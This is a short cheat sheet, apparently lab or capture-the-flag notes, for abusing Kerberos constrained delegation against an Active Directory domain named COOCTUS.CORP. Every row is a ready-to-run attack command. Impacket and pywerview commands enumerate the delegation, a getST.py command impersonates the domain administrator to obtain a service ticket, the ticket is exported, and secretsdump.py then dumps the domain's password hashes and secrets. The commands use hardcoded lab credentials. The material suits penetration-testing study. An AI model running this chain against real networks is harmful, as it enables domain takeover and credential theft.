# Constrained Delegation

| Info                                            | Command                                                                                                                  |
| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| Get info about the delegation                   | `findDelegation.py -debug COOCTUS.CORP/password-reset:resetpassword -dc-ip $ip`                                          |
| Get info about the delegation                   | `python3 /opt/pywerview/pywerview.py get-netuser -u password-reset -p resetpassword -t $ip -d COOCTUS.CORP`              |
| Impersonate and get ticket of the Administrator | `getST.py -spn oakley/DC.COOCTUS.CORP -impersonate administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip $ip` |
| Export ticket to a variable                     | `export KRB5CCNAME=administrator.ccache`                                                                                 |
| Dump secrets                                    | `secretsdump.py -k -no-pass DC.COOCTUS.CORP`                                                                             |
